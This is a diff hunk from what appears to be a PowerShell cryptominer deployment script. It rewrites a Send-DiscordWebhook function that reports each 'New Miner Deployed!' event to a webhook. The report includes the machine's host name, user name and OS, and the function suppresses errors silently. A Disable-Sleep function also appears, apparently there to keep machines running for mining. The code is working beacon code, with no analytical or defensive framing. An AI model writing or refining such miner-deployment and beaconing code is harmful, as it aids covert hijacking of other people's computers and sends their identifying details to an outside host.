@@ -564,20 +564,12 @@ function Send-DiscordWebhook {
         try { $osName = (Get-CimInstance Win32_OperatingSystem -ErrorAction Stop).Caption } catch {
             try { $osName = [System.Environment]::OSVersion.VersionString } catch {}
         }
-        $payload = @{
-            username = "SOINION"
-            avatar_url = "https://i.imgur.com/4M34hiw.png"
-            embeds = @(@{
-                    title = "New Miner Deployed!"
-                    color = 3447003
-                    fields = @(@{ name = "Host"; value = "$env:COMPUTERNAME"; inline = $true }, @{ name = "User"; value = "$env:USERNAME"; inline = $true }, @{ name = "OS"; value = "$osName"; inline = $false })
-                    footer = @{ text = "Deploy script executed successfully" }
-                    timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
-            })
-        } | ConvertTo-Json -Depth 5
-        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue | Out-Null
+        $ts = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
+        $json = '{"username":"SOINION","avatar_url":"https://i.imgur.com/4M34hiw.png","embeds":[{"title":"New Miner Deployed!","color":3447003,"fields":[{"name":"Host","value":"' + $env:COMPUTERNAME + '","inline":true},{"name":"User","value":"' + $env:USERNAME + '","inline":true},{"name":"OS","value":"' + $osName + '","inline":false}],"footer":{"text":"Deploy script executed successfully"},"timestamp":"' + $ts + '"}]}'
+        [System.Net.WebClient]::new().UploadString($webhookUrl, $json)
     } catch {}
 }
+
 
 function Disable-Sleep {
     try {
